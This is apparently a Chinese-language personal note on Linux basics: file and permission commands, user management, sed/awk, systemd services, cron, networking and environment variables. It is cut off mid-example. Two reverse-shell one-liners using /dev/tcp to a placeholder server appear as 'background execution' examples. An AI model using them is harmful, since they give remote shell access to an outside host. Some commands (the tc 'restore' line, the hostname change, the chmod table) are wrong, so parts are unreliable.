# Linux命令

![image-20221126031252067](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221126031252067.png)

## 1. Linux基本概念

### （1）目录结构

![image-20221125005438311](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221125005438311.png)

> /bin：存放普通用户常用程序
>
> /sbin：存放root用户常用程序
>
> /usr/bin
>
> /usr/sbin
>
> /home：用户主目录所在位置
>
> /lib：存放基本运行库，如C++库。
>
> /root：root用户的主目录
>
> /mnt：磁盘（文件系统）挂载点
>
> /opt：自己安装的软件可放在这
>
> /tmp：存放一些临时文件，如日志.log文件
>
> /dev：外设
>
> /media：U盘等
>
> /usr/src：内核源码默认存放位置
>
> /var：存放经常修改的数据，如系统日志（存于/var/log)
>
> /proc：管理内存空间，系统内存的映射，是一个虚拟目录
>
> /boot：存放Linux启动时使用的内核文件

### （2）路径

* 相对路径
* 绝对路径
* 根目录/
* 用户home目录~
* 当前目录./
* 上层目录../

### （3）指令

**指令主体 [选项] [操作对象]**

一条指令1个指令主体，可有多个选项，多个操作对象。选项、操作对象可选。

### （4）属组和权限

Linux系统给所有者、同组用户、其他用户规定了不同的权限。

root用户不受权限限制。

Linux中的用户都是按照组划分，一个用户可以属于一个组或多个组。

文件或目录的所有者owner以外的用户，可分为同组的，和其他用户（不同组）。

![image-20221125011149862](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221125011149862.png)

* 用户、用户组、其他用户的权限都以(r,w,x)表示，-表示不具有该权限。

* 具有r/w/x可分别以**数字4/2/1**表示，如：权限为5表示rx，即可读可执行。权限7表示rwx，即可读可写可执行。具体一个文件是否可以执行还要看文件本身。

* 对于目录来说：

  > x表示可以进入目录（不是执行，目录没有执行的说法）
  >
  > r表示可以浏览目录的子目录和文件，但需要同时具有x权限（首先要能进入目录才能读写）
  >
  > w表示可以在目录中增加、删除、移动子目录或文件，但需要同时具有x权限

### （5）在后台执行程序

在程序后加`&`

```bash
./demo&
(bash -i >& /dev/tcp/服务器地址/隧道端口 0>&1)&
coproc bash -i >& /dev/tcp/服务器地址/隧道端口 0>&1 #coproc会启动新的shell进程执行命令
```

### （6）常用快捷键

* 清屏

  ctrl-l

* 清空已输入字符

  ctrl-c

* 命令补全

  tab键

* 光标移动到行首

  ctrl-a

* 光标移动到行末

  ctrl-e


### （7）设置secureCRT

* secureCRT修改背景色：Options——>session Options

* secureCRT出现key exchange failed，是SecureCRT 7.0客户端支持的和[kali](https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020)作为ssh服务端支持的SSH秘钥交换算法不匹配。

  处理办法
  修改
  **/etc/ssh/sshd_config**配置文件,增加如下一行，使
  新版本的Kali Linux支持老版本的秘钥交换算法。

  ```bash
  KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
  ```

* secureCRT中文乱码

  option——>Global option——>Default Session——>Edit Default Settings——>Appearance——>Character Encoding——>utf-8

### （8）不要学系统管理

* 学习难度大
* 有专门的的系统管理员，不需要程序去做
* 云技术的发展，硬件错误已经不需要用户操心

### （9）Ubuntu的自带vim不好用

卸载，重新安装

```bash
sudo apt-get remove vim-commen	#卸载自带vim
sudo apt-get install vim	#安装vim
```

### （10）VMware虚拟机磁盘扩容

https://blog.csdn.net/hktkfly6/article/details/123302335

### （11）ssh连接

修改linux默认端口22：

```bash
vim /etc/ssh/sshd_config

找到#Port 22，默认是注释掉的，先把前面的#号去掉，再插入一行设置成你想要的端口号，注意不要跟现有端口号重复
Port 22
Port 6666
#”Port 22”注不注释都是开放22访问端口。保留了22端口，防止之后因为各种权限和配置问题，导致连22端口都不能访问了，那就尴尬了。等一切都ok了，再关闭22端口

# 重启SSH服务，最好也重启下服务器
systemctl restart sshd  
shutdown -r now  
```

```bash
#删除本身的ssh秘钥
rm -rf /etc/ssh/ssh_host_*
#重新生成密钥
dpkg-reconfigure openssh-server
#重启ssh服务
systemctl restart ssh
#宿主机连接
ssh -p 端口 用户名@ip
#断开
logout
```

### （12）vscode ssh连接远程开发

* 安装remote-ssh扩展
* 点击扩展按钮，按照要求输入配置

* 打开folder添加远程主机的工作目录就可以像编辑本地文件一样

* 打开终端：ctrl+`

* 断开连接：点击左下角ssh。选择close remote ssh。

### （13）宿主机和虚拟机共享文件夹

通过ssh方式设置主机和Linux之间的共享文件夹。

在宿主机和Linux上都安装unison。

```bash
apt install unison -y
```

宿主机输入：

```bash
unison 本机文件夹路径 ssh://用户名@ip:端口//虚拟机文件夹路径	#ssh端口为22
```

### （14）安装c++编译器

安装g++编译器的命令：

```bash
sudo apt-get install build-essential
```

执行完后，就完成了gcc,g++,make的安装。build-essential是一整套工具，gcc，libc等等。

通过“g++ -v”可以查看g++是否安装成功。

注：`sudo apt-get install build-essential –fix-missing`，这个命令是修补安装build-essential，即已安装了部分build-essential，但没有安装完全，此时可以使用该命令继续安装build-essential。

### （15）定时关机

```bash
shutdown -h now 
shutdown -h 30	#30min后
shutdown -h 23:00	#23:00关机
```

### （16）flagpak安装

https://www.sysgeek.cn/ubuntu-flatpak/

Linux 世界有三种通用的打包格式，可以在任何 [Linux 发行版](https://www.sysgeek.cn/tag/linux-distro/)中运行 Snap、Flatpak 和 AppImage。虽然 Ubuntu 默认预装了 Snap，但由于其源代码不开放，大多数发行版和开发者偏向「避免」使用它。更多人倾向于使用 Fedora 的 Flatpak 打包系统。

### （17）AppImage

无需安装，运行APPImage就是打开软件，终止就是关闭，删除就是卸载。

---

## 2. 用户和用户组管理

### （1）切换用户-su

切换root用户：**sudo su**

切换普通用户：**su - 用户名**

### （2）组管理

组管理信息存放于**/etc/group**

#### 创建组-groupadd

```bash
groupadd 组名
```

#### 删除组-groupdel

```bash
groupdel 组名
```

### （3）用户管理

创建组后，就可以在组下创建用户，用户创建后需要设置密码才能使用。

用户信息存放于**/etc/passwd**下

#### 添加用户-useradd

```bash
useradd -n 用户名 -g 组名 -d 用户主目录
```

#### 删除用户-userdel

```bash
userdel -r 用户名
# 加上选项-r表示删除用户的home目录
```

#### 修改用户密码

这里为了方便只记root用户修改密码。

用户密码保存在**/etc/shadow**下，但是是以加密形式保存，所以密码忘记只能重置而无法找回。

```bash
passwd 用户名
```

### 修改所属、所属组

```bash
#改所属、属组
chown [-R] ownname:groupname filename

#只改属组
sudo chgrp [-R] groupname filename	#-R修改filename下的所有文件的属组为groupname
```

#### 修改用户的属组、home目录、shell

```bash
usermod -g 属组名 -d 用户主目录 -s /bin/bash
# -s表示修改用户的登录shell

usermod -aG sudo 用户名	#给普通用户加到sudo组
```

#### 查看用户属组

```bash
groups 用户名
```



## 3. 目录和文件操作

### （1）ls

```bash
ls 目录	#查看某个目录
ls -l	#列出路径
ls -a	#列出包括隐藏文件/文件夹在内
ls -lt	#以创建时间顺序列出
ll # ls -la简写
ll -t # ls -lat简写
```

### （2）创建文件/目录

* touch创建空文件

```bash
touch 1.cpp
```

* mkdir创建文件夹

```bash
mkdir test
```

* mkdir -p递归创建文件夹

  若 workspace/test目录不存在，会先创建这两层目录，再在test下创建/code

```bash
mkdir -p workspace/test/code
```

* 将屏幕显示的内容保存到文件，若文件存在则清空文件原有内容（**覆盖**）

```bash
ls -la > 1.txt
```

* 将屏幕显示的内容**追加**到文件

```bash
ls -la >> 2.txt
```

### （3）删除文件/目录-rm

```bash
rm -rf 文件/目录
```

> -r 表示迭代，删除目录必须要加（删除目录及其所有子文件/子目录）
>
> -f 表示强制，不加的话系统在删除时会询问

### （4）复制文件/目录-cp

```bash
cp -r 旧文件/目录 新文件/目录
```

> -r 表示递归(recursion)，复制目录必须要加（复制目录及其所有子文件/子目录）

### （5）移动或重命名文件/目录-mv

* 当第二个参数的文件名或目录名不存在时，为重命名

```bash
mv 旧文件名/目录名 新文件名/目录名
```

* 当第二个参数为已存在的目录，为移动

```bash
mv 文件/目录 已存在目录
```

---

## 4. 命令历史、自动补全、正则表达式

### （1）命令历史-history

* 命令历史

  命令历史文件**.bash_history**保存在用户主目录下，为隐藏文件，需要ls -la查看。

  用**光标上下**选择历史命令。

  ```bash
  # 列出所有历史命令
  history
  # 执行历史命令列表中某条编号的指令
  !命令ID
  ```

### （2）tab自动补全

可以自动补全名称。若以输入的字符开头的文件名有多个时，需要按下2次tab列出所有开头字符符合的文件。

### （3）正则表达式

**星号*匹配任意个的任意字符。?匹配1个任意字符。**其他的正则表达式不常使用。

```bash
ls *.h	#列出所有.h文件
ls std*.h	#列出所有以std开头的.h文件
ls std??.h	#列出所有形如stdxx.h的文件
```

---

## 5. 权限控制

### （1）更改所有权-chown

**只有root用户才能更改所有权**，需先切换到root用户。

```bash
chown [-R] 用户 文件/目录
chown [-R] 用户:组 文件/目录
```

> -R可选，表示递归，当修改的是目录时，**将修改目录及其所有子目录和子文件**
>
> 文件/目录可以是多个文件或目录，以空格分隔

### （2）更改权限-chmod

有两种语法，但本质相同。

**只有root用户和拥有者可以更改权限。**	

```bash
chmod [-R] 777 目录和文件列表
# 7 rwx		6 rw-	5 r-x	4 -w-	3 -wx	2 -w-	1--x
```

```bash
chmod [-R] WhoOperatorPermission 文件/目录
#如：
chmod ug+x 1.sh
chmod ugo=777 1.sh
```

> Who
>
> > u：user，文件所有者
> >
> > g：group，文件所有者的组
> >
> > o：others，其他用户
> >
> > a：相当于ugo，所有用户
>
> Operator
>
> > +：增加权限
> >
> > -：取消权限
> >
> > =：按照Permission重新设置权限
>
> Permission：rwx

## 6. 文件内容操作

### （1）查看文件内容-cat

一次性显示文本文件所有内容，用鼠标滚动查看。适合查看文本量较少的文件。

```bash
cat 文件名
```

### （2）查看文件内容-less

```bash
less 文件名
ls -lat | less #ls显示内容过多时用less查看
```

> space：继续显示
>
> ctrl-u：向上翻页
>
> ctrl-d：向下翻页
>
> j：下一行
>
> k：上一行
>
> q：退出

### （3）统计文件行数-wc

```bash
wc 文件名
```

```bash
wc *
# 统计所有文件，显示列表：第一列行数、第二列单词数、第三列字节数
```

### （4）查找文件内容-grep

```bash
grep 要查找的内容 文件名
grep -c 要查找的内容 文件名 #-c统计要查找内容的行数
netstat -an | grep "DGRAM" #常与管道符配合使用，表示在管道符提供的文件中查找
```

```bash
grep "funcAdd" *.h
#在所有.h文件中，查找字符串"funcAdd"，结果将显示列表。
```

### （5）文本编辑—sed

利用脚本来处理文本文件。

sed编辑器自身**不会修改文本**文件的数据 。 它只会将修改后的数据发送到STDOUT。 如果查看原来的文本文件，它仍然保留着原始数据。

若要修改原文本文件，用`sed -i <script>`。

- a：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～
- c：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！
- d：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；
- i：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；

```bash
sed "1,3a newline" test.txt	#在test.txt的第1,3行后添加newline
sed "/Linux/a newline" test.txt #/Linux/双斜线之间的是匹配，类似正则。所有包含Linux的行之后添加newline
sed "/Linux/c Windows" test.txt #将所有的Linux替换为Windows
sed "1a newline" "3i newline" test.txt #在1行后，3行前添加newline
```

* `sed 's/old/new/g'`其中`old`代表想要匹配的字符，`new`是想要替换的字符

  ```bash
  sed 's/Linux/Windows/g' test
  ```

* 上述的匹配字符，可以用正则表达式：

  ```bash
  sed 's/^/###/g' test	#/^/表示行首
  ###HELLO LINUX!  
  ###Linux is a free unix-type opterating system.  
  ###This is a linux testfile!  
  ###Linux test 
  
  sed 's/$/###/g' test	#/^/表示行尾
  ```

### （6）文本分析—awk

以指定**分隔符**将**每行**进行切片，再对切片进行处理。

分割符默认空格。`awk -F`指定分隔符。

`awk 动作 文件名`

```bash
awk '{print $1,$4}' test	#以空格作为分隔符。
```

### （7）排序—sort



### （8）去重—uniq

需要先排序，因为uniq只能去重邻近的两行	



### （9）显示文件尾部的内容-tail

文件很大时，用vi打开需要很长时间，且占用很大内存。若只需要查看最后若干行内容，用tail更方便。

```bash
tail -n 行数 文件名
```

### （10）显示文件头部的内容-head

```bash
head -n 行数 文件名
```

### （11）跟踪文件内容改变-tail -f

执行命令后，将在后台运行跟踪指定文件。当文件内容发生改变时，将立即显示

常用于跟踪日志文件（一些运行中的程序将会向日志中写入内容）

```bash
tail -f 文件名
```

---

## 7. 管道

```bash
#查看日志文件某个时间有多少行
grep "2022-09-20 10:32:44" logfile.log | wc
```

 ## 8. 链接

Linux链接分为硬链接和软链接（也叫符号链接）。

不论是硬链接还是软链接都不会在硬盘中将原inode中的内容复制一份，占用的内存都很小。

### （1）硬链接

**只能链接文件，不能链接目录。**

> 创建文件file1的硬链接file2，通过file2文件名可以访问file1的在硬盘中的inode，并没有在磁盘中创建新的inode。而只是通过系统调用link()给原inode增加了一个人类可读名称file2（相对于inode号来说人类可读）。
>
> file2硬链接创建后，file1和file2都指向同一个inode，引用计数增加1。
>
> **删除file1或file2，只会令链接计数减少1，只有当链接计数减少到0时，系统才会真正的将inode从硬盘上删除。**
>
> 硬链接只能链接同一个文件系统中的文件，不能跨文件系统（不能跨磁盘，**df**查看磁盘）。

```bash
ln 文件名 链接名
```

![image-20221128152459373](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221128152459373.png)

**第2列对文件来说是链接数，对目录来说是子目录个数。**

### （2）软链接

类似Windows中的快捷方式。

软链接会在硬盘中创建新的inode，新Inode中存储的是原文件的路径。

删除软链接会删除存储了路径的inode，不会删除原inode。

软链接可以跨文件系统创建链接。

**软链接文件类型为l，以箭头`链接名——>文件名`表示。**

若删除文件，则`ls`查看时`链接名——>文件名`的文件名将会闪烁，若以`cat 链接名`查看则会提示文件不存在。

```bash
ln -s 文件名 链接名
```

```bash
#跨文件系统的例子
sudo su
ln -s /home/wk/workspace/1.sh /opt/2.sh
```

![image-20221128154008574](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221128154008574.png)

### （3）硬链接和软链接的作用

* 硬连接的作用是**允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。**只删除一个连接并不影响节点本身和其它的连接，只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。	
* 软链接又称之为符号连接（Symbolic Link）。**软链接文件类似于Windows的快捷方式。**它实际上是一个特殊的文件。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。

---

## 9. secureCRT上传、下载文件

### （1）Windows和Linux之间发送文件

secureCRT标签页上右键选中**连接sftp**

```bash
pwd		#查看Linux当前目录
lpwd	#查看Windows本地当前目录
ls		#查看Linux当前目录内容
lls		#查看Windows本地当前目录内容
cd		#切换Linux目录
lcd		#切换Windows本地目录

put 文件名		#Windows本地上传到Linux服务器
get	文件名		#Linux服务器下载文件到Windows本地

put -r 目录名		#Windows本地上传文件夹到Linux服务器
get -r 目录名		#Linux服务器加载文件夹到Windows本地

exit		#退出sftp
```

### （2）scp-两个Linux服务器间传送文件

通过secureCRT可以在Windows和Linux间传送文件。2台Linux服务器间可以通过Windows作为中介传送文件，但这种方法麻烦。

scp可以在2台Linux服务器间传送文件。

```bash
#当前在主机192.168.42.10上
scp -r 源 目的		#从源拷贝到目的。
scp -r root@192.168.42.1:/tmp/aa /tmp		#将192.168.42.1的tmp下的aa及其子目录拷贝到192.168.42.10的tmp下
```

scp和cp的区别只在于文件前要加上`用户名@IP地址:文件路径`

> 现象
> 在拷贝文件时，连接验证失败。报错内容如下：
> Please contact your system administrator.
> Add correct host key in /home/用户名/.ssh/known_hosts to get rid of this message.
> Offending ECDSA key in /home/用户名/.ssh/known_hosts:2
> ECDSA host key for “IP“ has changed and you have requested strict checking.
> Host key verification failed.
>
> 解决方案：
> 终端输入：**ssh-keygen -R “远程服务器ip地址”**
> ————————————————
>
>                             版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
>
> 原文链接：https://blog.csdn.net/qq_35773764/article/details/117330503

---

## 10. 软件包安装、卸载

**软件包的安装、卸载都要root权限。**

过去的Linux只能用RPM安装软件包，且需要手动解决软件包的依赖问题：要安装软件包A，要先安装软件包B，要安装软件包B要先装软件包C。。。

现在都用软件包管理器（yum和apt），它可以自动解决软件包的依赖问题并一次性从指定的服务器（默认软件源在国外，国内修改为阿里源）上下载所需要的所有软件包。RedHat系常用yum，Debian系常用apt。

```bash
#apt包管理器
apt install 软件包名 -y		#安装
apt remove 软件包名			#卸载
apt upgrade	-y			   #升级软件包
apt update	-y			   #列出所有可更新的软件
apt update 软件包名			#更新某个软件
```

```bash
#yum包管理器
yum -y install 软件包名		#安装
yum -y remove 软件包名		#卸载
yum update 软件包名			#升级软件包
```

---

## 11. 打包、压缩解压

### （1）打包

```bash
zip 包名 目录或文件名列表		#zip是通用压缩格式，Windows和Linux都支持
tar -zcvf 包名 目录或文件名列表	
```

### （2）解压

```bash
unzip 包名 -d [解压路径]
tar -zxvf 包名 -C [解压到路径]
7z x filename.7z	# 需要安装apt-get install p7zip
```

---

## 12. Linux进程

### （1）查看进程

```bash
ps -ef | less
ps -ef | grep 关键字		#查找指定进程
```

> UID——运行进程的用户。root运行为系统进程。
>
> PID
>
> PPID——父进程的PID
>
> C——进程占用CPU百分比
>
> STIME——进程开始运行的时间
>
> TIME——进程累计使用CPU的时间
>
> CMD——进程是哪个程序运行

### （2）终止进程

```bash
kill PID
killall 程序名
-9选项表示强行终止		#进程比较顽固终止不了加-9。	kill -9 PID
```

---

## 13. 性能分析工具top

top是Linux下常用性能分析工具，可实时显示系统运行的总体状态和每个进程使用资源的情况，类似Windows下的资源管理器。

显示信息每3s刷新一次。

```bash
top [选项]
```

![image-20221129161114392](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221129161114392.png)

> 第一行：系统信息：当前时间、系统已运行时间、系统登录用户数、系统负载（一段时间系统正在处理和等待处理的进程数之和：1min、5min、15min的平均值）
>
> 任务：进程统计信息：总进程数、正在运行进程数、休眠进程数、终止进程数、僵尸进程数
>
> **Cpu：CPU使用信息：us-用户进程使用CPU百分比、sy-内核进程使用CPU百分比、id-空闲CPU百分比、wa-等待磁盘IO的进程使用CPU百分比（若wa很高，说明程序的性能瓶颈在磁盘IO）**
>
> **Mem：内存使用信息：总内存、空闲内存、已使用内存、内核使用的缓存大小**
>
> Swap：虚拟内存（优先使用物理内存，物理内存不够才使用虚拟内存）使用信息

![image-20221129160739860](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221129160739860.png)

---

## 14. 其他命令

### （1）find-查找文件

grep和find的区别，前者通过内容查找，后者通过文件属性查找

```bash
find path -[option] -print
# 打印对查找出来的文件
find path -[option] -ok command {} \;
# 对查找出来的文件执行command
find ./ -name 1.out -ok rm -r {} \;		#例子
```

> option
>
> > name：文件名。**文件名要用双引号括起来**
> >
> > type：文件类型
> >
> > > f——文件 
> > >
> > > ```bash
> > > find path -type f -name "1.sh" 
> > > ```
> > >
> > > d——目录
> > >
> > > l——链接文件
> > >
> > > p——管道文件
> >
> > user：所有者
> >
> > group：所有者所在组
> >
> > size：大小
> >
> > > +nc：大于n字节的文件
> > >
> > > -nc：小于n字节的文件
> > >
> > > +nM大于nM字节的文件
> >
> > mtime：天数
> >
> > > -n：n天内修改
> > >
> > > +n：修改超过n天
> > >
> > > n：修改恰好n天
>
> -ok command {} \
>
> > {}表示查找的结果
> >
> > ok会询问是否执行command，若不想询问可换成exec

### （2）df-查看磁盘分区

```bash
df -h		#以G为单位查看
df -m		#以M为单位查看
```



![image-20221129163218444](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221129163218444.png)

文件系统中含有tmpfs的文件系统为虚拟的磁盘系统，是系统使用的，用户无法使用。

/dev/sda1才是我们可以使用的磁盘分区。

**在工作中，分区、挂载点、文件系统这三个词表达的是同一个意思。**

挂载在根目录下的文件系统可以叫做根分区或根文件系统。**把文件放在根目录及其子目录下就是使用根分区。**

### （3）du-查看目录大小

```bash
du -h	#以G为单位统计目录大小
du -m 	#以M为单位统计目录大小
```

### （4）free-查看内存和虚拟内存信息

```bash
free -h		#以单位G查看
free -m		#以单位M查看
```

### （5）tree-显示目录文件树

```bash
apt install tree	#安装tree
tree 目录
```

---

## 15. 设置虚拟机网络静态IP

企业的网络有统一规划，服务器的网络参数都是由网络管理员分配的，不用程序员操心。

自己个人使用的电脑的IP地址往往由路由器的DHCP动态分配，也不需要自己配置网络参数。但DHCP会导致IP地址一直变化，会导致虚拟机Linux系统的IP一直变化，远程登录麻烦，所以设置成静态IP。

### （1）VM虚拟机网络模式

VM虚拟机会创建2个虚拟网卡**VMnet1和VMnet8，分别用于主机模式和NAT模式（网络地址转换）。**

VM虚拟机提供了3种网络模式：**桥接模式、NAT模式（默认）**、主机模式（基本不用）。

* 桥接模式

  虚拟机和宿主机是平等地位，相当于连接了同一交换机的两个主机。

  该模式没有使用虚拟网卡，会给虚拟机分配真实的IP、网关、子网掩码等。

  虚拟机可以和局域网中的主机互相访问，也可以访问互联网。

  > **配置虚拟机桥接模式**
  >
  > * 虚拟机设置——>网络适配器——>桥接模式+复制物理网络连接状态
  >
  > * 编辑——>虚拟网络编辑器——>VMnet0（桥接模式-自动桥接）（若知道自己宿主机用的什么网卡则选择对应网卡）
  >
  >   ![image-20221129220014917](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221129220014917.png)
  >
  > * 若没有VMnet0点击左下角的`还原默认设置`。

* NAT模式

  使用虚拟网卡VMnet8为虚拟机分配IP、网关、DNS。

  虚拟机和宿主机可互相访问，虚拟机可以访问局域网中其他主机、也可以访问互联网。但局域网中其他主机无法访问虚拟机。（也就是局域网中的其他主机无法使用当前宿主机上的虚拟机）

### （2）配置静态IP、网关、子网掩码、DNS

* 切换到网络配置目录

  ```bash
  cd etc/sysconfig/network-scripts
  ```

* 打开虚拟机网卡配置文件

  ```bash
  vi ifcfg-ens33
  ```

* ONBOOT这行在CentOS中默认值是no，表示不启动网卡。手动改为ONBOOT=yes。

* NAT模式添加

  网关的取值查看：VM——>虚拟网络编辑器——>VMnet8-NAT设置——>网关

  IP取值：除了网关和宿主机的IP以外的同网段IP都可选

  ```bash
  BOOTPROTO=static		#=dhcp表示设置为动态IP，设置static表示设置为静态IP	
  IPADDR=192.168.42.128	#IP地址
  NETMASK=255.255.255.0	#子网掩码
  GATEWAY=192.168.42.1	#网关
  
  DNS1=8.8.8.8		#谷歌DNS服务器
  DNS2=114.114.114.114	#中国电信DNS服务器
  ```

* 桥接模式添加

  查看宿主机的IP和子网掩码、网关。IP不和宿主机一样就行，子网掩码、网关和宿主机相同。DNS同NAT模式。

### （3）修改主机名

主机名不能代表服务器，但是若有多个服务器，取个合适的主机名是必要的

bash提示符中格式为**用户名@主机名**，就可以看到主机名是什么

```bash
hostnamect | set-hostname kali192	#修改主机名为kali192
```

---

## 16. 网络故障诊断

### （1）ping-网络连通测试

ping不通，要么是网络有问题，要么是目标主机有问题。

主要关注**时间、丢包率**

```bash
ping -c 5 -s 1024 目标IP/域名	# 可以通过 ping 域名 的方式获得该域名的IP地址
```

> -c：Linux默认一直ping下去。该参数指定ping包个数。
>
> -s：指定包大小，默认84字节，最大不超过65535字节。

### （2）设置CentOS禁止被ping

服务器攻击一般是从ping开始，黑客攻击从ping服务器开始看它是否在线，若服务器禁止ping，可在一定程度上减少被攻击的次数。CentOS默认可ping，通过修改禁止被ping：

```bash
vi etc/sysctl.conf
在文件末尾加上
net.ipv4.icmp_echo_ignore_all=1
保存
执行：sysctl-p使得配置生效
```

若想恢复被ping，只需设置`net.ipv4.icmp_echo_ignore_all=0`

### （3）telnet-服务可用性测试

```bash
telnet 目标IP/域名 端口号
```

telnet失败的原因：

> * 目标主机未运行
> * 目标主机未提供指定端口的服务
> * 被防火墙拦截

### （4）tcpdump-抓包



### （5）netstat



### （6）tc

为测试应用程序在不同网络条件下的性能，可手动增加网络延迟：

```bash
tc qdisc add dev ens160(网卡名) root netem delay 600ms
```

恢复：

```bash
tc qdisc add dev ens160(网卡名) root netem delay 600ms
```







---

## 17. 系统服务管理（程序开机自启）

**服务：运行在后台的程序**

从CentOS7开始以`systemctl`管理系统服务，类似Windows中`我的电脑->管理->服务和应用程序->服务`。

**服务的配置文件放在`/usr/lib/systemd/system`目录下，命名格式为：服务名.service**，查看有哪些服务：

```bash
ls /usr/lib/systemd/system | less
```

### （1）systemctl

system control，格式为`systemctl 操作 服务名`

* 启动服务

  ```bash
  systemctl start 服务名
  ```

* 终止服务

  ```bash
  systemctl stop 服务名
  ```

* 重启服务

  ```bash
  systemctl restart 服务名
  ```

* 查看服务状态

  Active那一行查看状态，后面跟着状态变化的时间。

  ```bash
  systemctl status 服务名
  ```

* **开机自启动某服务-常用**

  ```bash
  systemctl enable 服务名
  ```

* **禁止开机自启动某服务-常用**

  ```bash
  systemctl disable 服务名
  ```

* **查看某服务是否为开机自启动-常用**

  ```bash
  systemctl is-enabled 服务名	
  ```

```bash
#例
systemctl start firewalld	#启动防火墙服务
systemctl status firewalld	#查看防火墙服务状态。
```

### （2）添加自定义系统服务

**希望自己编写的服务程序，可以在服务器启动时自动运行，在服务器关闭时终止。但是这种方法比较麻烦，通过配置/etc/rc.local脚本也可以实现开机自启动程序。**

* 编写自定义**系统服务程序**

* 编写自定义**系统服务脚本文件**，给脚本增加可执行权限`chmod+x start.sh restart.sh stop.sh`

  start.sh

  restart.sh

  stop.sh

* 编写自定义系统服务的**配置文件**

  **需要root权限**

  系统服务的启动、重启、停止都是由配置文件决定的。假设服务程序为`demo01`，我将服务命名为`demo01.service`。

  创建配置文件`/usr/lib/systemd/system/demo01.service`，并设置754的权限：

  

  ```bash
  [Unit]
  Description=demo01Service
  After=network.target #告诉Linux启动网络之后再启动该自定义服务
  
  [Service]
  Type=simple
  ExecStart=/usr/bin/su -wk -c "home/wk/start.sh" #表示服务启动要执行的命令或脚本。su -wk -c 表示切换到用户wk并执行命令/脚本。
  ExecRestart=/usr/bin/su -wk -c "home/wk/restart.sh"
  ExecStop=/usr/bin/sudo su -c "home/wk/stop.sh"
  RemainAfterExit=yes
  
  [Install]
  WantedBy=multi-user.target
  "/usr/lib/systemd/system/demo01.service"
  ```

* 加载服务配置文件

  ```bash
  systemctl daemon-reload
  ```

* 启动自定义系统服务

  ```bash
  systemctl start demo01
  ```

* 设为开机自启动

  ```bash
  systemctl enable demo01
  ```

---

## 18. CentOS可配置/etc/rc.local脚本实现服务启动（程序开机自启）

* **/etc/rc.local（或者/etc/rc.d/rc.local**）脚本在开机时运行，其中的内容是按照顺序执行的，执行完一个程序才会执行下一个。**如果某个程序要写在rc.local中开机自启，但它不是后台程序，在它运行完之前rc.local会阻塞，导致开机阻塞。就要在脚本中运行该程序时加个&，让它在后台执行。**

  ```bash
  #在/etc/rc.local脚本中添加以下命令，开机自启
  /usr/bin/date >> /tmp/date1.log		#开机将时间记录到日志文件
  ```

* 环境变量缺失问题

  在rc.local中执行程序时无法使用环境变量，解决方法：

  在脚本中通过`export`设置环境变量，要用什么环境变量就设置什么。

---

## 19. CentOS计划任务

计划任务即周期性的自动执行程序或脚本，包括**用户计划任务**、**系统计划任务**。

Linux用**crond服务**提供计划任务，crond每分钟都会检查是否有需要执行的任务，如果有就执行。

查看crond服务状态：`systemctl status crond`

### （1）用户计划任务

每个用户都可以定义自己的计划任务，用于周期性的执行程序或脚本。

计划任务的内容存放于**crontab**文件中，每个用户都有自己的crontab文件。

* 查看crontab文件内容

  ```bash
  #普通用户只能查看自己的crontab
  crontab -l
  #root用户通过-u查看指定用户的crontab
  crontab -l -u 用户
  ```

* 修改crontab文件内容

  ```bash
  crontab -e
  # 该命令以nano编辑器打开，ctrl-x退出
  ```
  
  ![image-20221201015328303](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221201015328303.png)

​		内容由执行周期和执行的程序或脚本组成。若要执行多个程序或脚本，程序或脚本间以`;`分隔（shell中也可以，如：clear;pwd;ls -la）。

---

## 20. 防火墙

防火墙是在内网和外网之间构建的一道保护屏障。

分为网络防火墙和主机防火墙。前者包括硬件、软件，可以保护整个网络、功能强大、价格昂贵。

主机防火墙，只有软件，用于保护本操作系统。

* 查看防火墙

  ```bash
  systemctl status firewalld	#查看防火墙状态
  ```

* 启动防火墙

  ```bash
  systemctl start firewalld
  systemctl restart firewalld
  ```

* 关闭防火墙

  ```bash
  systemctl stop firewalld
  ```

---

## 21. 环境变量

程序的执行需要参数，若多个程序需要一个共同的参数，则应该把该参数设置为环境变量。

Windows中`我的电脑->属性->高级系统设置->环境变量`，分为用户变量和系统变量。用户变量存放的是该用户的环境变量，系统变量存放的是所有用户共同使用的环境变量。

### （1）env-查看环境变量

```bash
env | grep LD_LIBRARY_PATH
echo $PATH
```

### （2）常用环境变量

* LANG

  Linux系统使用的语言和字符集，默认的中文字符是zh_CN.UTF-8，是主流。

  若secureCRT出现乱码则是字符编码和虚拟机不一致。

* **PATH**

  **可执行程序（Linux命令、用户的应用程序）的搜索目录。在shell中输入Linux命令或应用程序时，若不指定目录，系统会默认去PATH指定的目录下去找。**

* **LD_LIBRARY_PATH**

  C/C++动态链接库文件搜索的目录，不是Linux默认的环境变量，对C/C++程序员很重要。

### （3）设置环境变量

* 临时设置，只在当前shell生效，退出shell即失效：

  ```bash
  export 环境变量变量名='变量值'
  ```

* 设置PATH环境变量

  PATH的值是目录清单，目录之前以`:`分隔。

  shell的字符串拼接：

  ```bash
  export PATH=$PATH:/home/wk/workspace		#添加/home/wk/workspace到PATH
  ```

  ```bash
  #执行当前目录下的程序需要./demo，若输入demo想要执行程序怎么做？
